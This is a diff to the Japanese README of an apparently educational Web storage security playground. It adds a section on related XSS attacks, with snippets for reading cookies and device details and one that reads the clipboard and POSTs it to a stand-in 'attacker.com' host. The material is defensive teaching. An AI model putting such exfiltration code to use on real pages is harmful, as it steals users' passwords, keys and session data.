@@ -117,6 +117,38 @@
 | **データ改ざん** | localStorage内のデータを書き換えられ、アプリの動作が異常に | 🟡 中程度 |
 | **マルウェア埋め込み** | 永続的な悪意のあるコードが仕込まれる | 🔴 重大 |
 
+### 🔗 関連する攻撃手法
+
+本ツールはlocalStorage/sessionStorageに焦点を当てていますが、実際のXSS攻撃では以下の手法と組み合わされることがあります：
+
+#### 📋 クリップボード攻撃
+```javascript
+// ユーザーがコピーした機密情報（パスワード、秘密鍵等）を窃取
+const clipboardData = await navigator.clipboard.readText();
+fetch('https://attacker.com/steal-clipboard', {
+  method: 'POST',
+  body: clipboardData
+});
+```
+
+#### 🍪 Cookie窃取
+```javascript
+// HttpOnlyでないCookieを窃取
+document.cookie; // "sessionid=abc123; preferences=dark"
+```
+
+#### 📱 デバイス情報収集
+```javascript
+// ブラウザ・OS・画面解像度等の情報収集
+navigator.userAgent;
+screen.width + "x" + screen.height;
+```
+
+#### 🎯 複合攻撃の例
+実際の攻撃では、localStorage/sessionStorage、Cookie、クリップボード、デバイス情報を**同時に窃取**して攻撃者サーバーに送信することで、より大きな被害をもたらします。
+
+⚠️ **重要:** 本ツールはWebストレージのセキュリティリスクの学習に特化していますが、実際のセキュリティ対策では、これらの関連攻撃も含めた包括的な防御策が必要です。
+
 ### 防御策
 
 #### ✅ 推奨される対策
@@ -229,10 +261,8 @@ localstorage-playground/
 ├── CLAUDE.md                 # 開発ドキュメント（Claude向け）
 ├── README.md                 # プロジェクト説明書
 ├── LICENSE                   # MITライセンス
-├── assets/                   # 静的リソース
-│   └── screenshot.png        # デモスクリーンショット
-├── app.js                    # 統合版JS（旧バージョン）
-└── script.js                 # 統合版JS（旧バージョン）
+└── assets/                   # 静的リソース
+    └── screenshot.png        # デモスクリーンショット
 ```
 
 ---
